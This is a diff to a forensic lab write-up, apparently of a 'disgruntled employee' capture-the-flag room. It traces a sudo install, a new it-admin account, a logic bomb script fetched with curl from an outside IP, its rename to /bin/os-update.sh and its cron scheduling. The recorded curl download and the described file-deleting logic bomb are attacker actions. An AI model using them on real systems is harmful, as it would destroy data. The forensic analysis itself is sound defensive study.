@@ -19,7 +19,7 @@ The goal was to determine what the user did on the host, identify malicious arti
 - Searched the authentication log for install actions:
 cd /var/log
 cat auth.log | grep install  
-## Findings
+#### Findings
 - **Full command executed with sudo:**  
   `/usr/bin/apt install dokuwiki`
 - **Present Working Directory when command ran:**  
@@ -33,7 +33,7 @@ cat auth.log | grep install
 - Searched `auth.log` for user creation and sudo updates:
 cat auth.log | grep adduser
 cat auth.log | grep sudo
-## Findings
+#### Findings
 - User created: it-admin
 - sudoers file updated at: Dec 28 06:27:34
 
@@ -44,7 +44,7 @@ cat auth.log | grep sudo
 ### 3. Script activity and editor history
 - Inspected auth.log and editor artifacts to find edited script:
 cat auth.log
-## Findings:
+#### Findings:
 - Script opened with vi: bomb.sh
 
 <img src="screenshots/disgruntled-vi-open.png" alt="vi opened bomb.sh" width="600">
@@ -53,7 +53,7 @@ cat auth.log
 
 ### 4. Download and creation of the malicious script
 Reviewed .bash_history of the user (it-admin) and other artifacts.
-## Findings:
+#### Findings:
 - Command used to fetch the script:
 - curl 10.10.158.38:8080/bomb.sh --output bomb.sh
 - Script renamed/moved to: /bin/os-update.sh
@@ -67,7 +67,7 @@ Reviewed .bash_history of the user (it-admin) and other artifacts.
 - Opened the malicious script to inspect behavior:
 nano /bin/os-update.sh
 
-## Findings:
+#### Findings:
 - Script creates a file: goodbye.txt
 - Contains logic to delete files of the installed service if last login > 30 days → logic bomb.
 
@@ -78,7 +78,7 @@ nano /bin/os-update.sh
 ### 6. Scheduling — crontab analysis
 - Checked scheduled tasks to find when the logic bomb would execute:
 crontab -l
-## Findings:
+#### Findings:
 - Malicious task scheduled to run at: 08:00 AM
 
 <img src="screenshots/disgruntled-crontab.png" alt="crontab evidence" width="600">
